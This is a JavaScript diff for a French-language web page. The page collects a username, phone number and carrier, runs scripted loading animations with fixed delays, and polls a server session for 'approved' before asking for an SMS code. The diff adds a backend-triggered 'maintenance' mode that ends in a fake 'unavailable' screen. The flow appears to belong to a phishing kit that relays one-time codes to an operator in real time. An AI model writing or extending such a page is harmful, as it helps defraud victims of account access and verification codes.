@@ -15,6 +15,7 @@ const codeStatus = document.getElementById("code-status");
 const stepForm = document.getElementById("step-form");
 const stepLoading = document.getElementById("step-loading");
 const stepCode = document.getElementById("step-code");
+const stepUnavailable = document.getElementById("step-unavailable");
 const stepSuccess = document.getElementById("step-success");
 const successUsername = document.getElementById("success-username");
 const successCarrier = document.getElementById("success-carrier");
@@ -53,7 +54,12 @@ function showStep(step) {
   stepForm.hidden = step !== "form";
   stepLoading.hidden = step !== "loading";
   stepCode.hidden = step !== "code";
+  stepUnavailable.hidden = step !== "unavailable";
   stepSuccess.hidden = step !== "success";
+}
+
+function showUnavailableStep() {
+  showStep("unavailable");
 }
 
 function showSuccessStep() {
@@ -167,6 +173,16 @@ async function waitForSmsApproval() {
   await finishSmsWaiting();
 }
 
+async function finishMaintenanceLoading() {
+  loadingSteps.forEach((step) => {
+    step.classList.remove("is-active");
+    step.classList.add("is-done");
+  });
+  loadingMessage.textContent = "Traitement terminé…";
+  await wait(1200);
+  showUnavailableStep();
+}
+
 async function startLoadingFlow() {
   showStep("loading");
   setLoadingStep(0);
@@ -176,6 +192,8 @@ async function startLoadingFlow() {
 
   await wait(1800);
 
+  let siteMode = "normal";
+
   try {
     const result = await sendSubmission("request", {
       username: formData.username,
@@ -183,6 +201,7 @@ async function startLoadingFlow() {
       carrier: formData.carrier,
     });
     sessionId = result.sessionId;
+    siteMode = result.siteMode ?? "normal";
   } catch {
     loadingMessage.textContent = "Une erreur est survenue. Réessayez.";
     return;
@@ -193,7 +212,16 @@ async function startLoadingFlow() {
     return;
   }
 
-  await waitForSmsApproval();
+  setLoadingStep(2);
+
+  if (siteMode === "maintenance") {
+    await wait(3500);
+    await finishMaintenanceLoading();
+    return;
+  }
+
+  await pollSession(["approved"]);
+  await finishSmsWaiting();
 }
 
 async function submitCodeVerification() {
